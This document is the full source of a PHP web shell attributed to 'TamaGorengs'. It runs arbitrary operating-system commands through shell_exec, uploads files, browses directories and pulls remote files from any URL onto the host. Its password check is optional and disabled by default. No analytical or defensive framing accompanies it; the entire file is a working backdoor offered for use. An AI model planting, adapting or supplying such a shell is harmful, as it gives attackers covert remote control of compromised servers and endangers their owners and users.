<?php
// Simple PHP Webshell by TamaGorengs
// Features: command execution, file upload, directory change, file fetch

// Configuration
$authPrompt = "Enter password: ";
$passHash = ""; // Optional: put a hash of your password here for authentication

// Utility function to sanitize output
function safeEcho($str) {
    echo htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

// Password hashing function (HMAC-SHA256)
function generateHash($input) {
    global $authPrompt;
    if (function_exists('hash_hmac')) {
        return hash_hmac('sha256', $input, $authPrompt);
    }
    return '';
}

// Authentication check
if ($passHash !== '') {
    $providedAuth = $_POST['auth'] ?? '';
    if ($providedAuth === '') {
        // Show password form
        echo '<form method="post">';
        echo safeEcho($authPrompt) . ' <input type="password" name="auth" />';
        echo '<input type="submit" value="Login" />';
        echo '</form>';
        exit;
    }
    if (generateHash($providedAuth) !== $passHash) {
        echo "Authentication failed.";
        exit;
    }
}

// Initialize variables
$command = $_POST['command'] ?? '';
$currentDir = $_POST['currentDir'] ?? getcwd();
$uploadFile = $_FILES['uploadFile'] ?? null;
$fetchUrl = $_POST['fetchUrl'] ?? '';

// Change directory if possible
if (!@chdir($currentDir)) {
    $currentDir = getcwd();
}

// Handle file upload
$uploadStatus = '';
if ($uploadFile && $uploadFile['error'] === UPLOAD_ERR_OK) {
    $destination = $currentDir . DIRECTORY_SEPARATOR . basename($uploadFile['name']);
    if (move_uploaded_file($uploadFile['tmp_name'], $destination)) {
        $uploadStatus = "File uploaded successfully: " . safeEcho($destination);
    } else {
        $uploadStatus = "Failed to move uploaded file.";
    }
}

// Handle file fetch from URL
$fetchStatus = '';
if (!empty($fetchUrl)) {
    $fileName = basename(parse_url($fetchUrl, PHP_URL_PATH));
    $savePath = $currentDir . DIRECTORY_SEPARATOR . $fileName;
    $fileContent = @file_get_contents($fetchUrl);
    if ($fileContent !== false) {
        if (file_put_contents($savePath, $fileContent) !== false) {
            $fetchStatus = "Fetched and saved file: " . safeEcho($savePath);
        } else {
            $fetchStatus = "Failed to save fetched file.";
        }
    } else {
        $fetchStatus = "Failed to fetch file from URL.";
    }
}

// Execute command if provided
$commandOutput = '';
if (!empty($command)) {
    $commandOutput .= "Command: " . safeEcho($command) . "\n\n";
    if (DIRECTORY_SEPARATOR === '/') {
        $commandOutput .= shell_exec($command . ' 2>&1');
    } else {
        // Windows
        $commandOutput .= shell_exec("cmd /c \"$command\" 2>&1");
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>PHP Webshell</title>
<style>
    body { font-family: monospace; background: #f0f0f0; padding: 20px; }
    textarea { width: 100%; height: 200px; }
    input[type=text], input[type=file] { width: 100%; }
    .status { margin: 10px 0; color: green; }
    .error { color: red; }
</style>
</head>
<body>

<h2>PHP Webshell</h2>

<form method="post" enctype="multipart/form-data">
    <label>Current Directory:</label><br />
    <input type="text" name="currentDir" value="<?php safeEcho($currentDir); ?>" /><br /><br />

    <label>Command to execute:</label><br />
    <input type="text" name="command" value="<?php safeEcho($command); ?>" /><br /><br />

    <label>Upload file:</label><br />
    <input type="file" name="uploadFile" /><br /><br />

    <label>Fetch file from URL:</label><br />
    <input type="text" name="fetchUrl" value="<?php safeEcho($fetchUrl); ?>" /><br /><br />

    <input type="submit" value="Run" />
</form>

<?php if ($uploadStatus): ?>
    <div class="status"><?php echo $uploadStatus; ?></div>
<?php endif; ?>

<?php if ($fetchStatus): ?>
    <div class="status"><?php echo $fetchStatus; ?></div>
<?php endif; ?>

<?php if ($commandOutput): ?>
    <h3>Command Output:</h3>
    <pre><?php echo safeEcho($commandOutput); ?></pre>
<?php endif; ?>

</body>
</html>
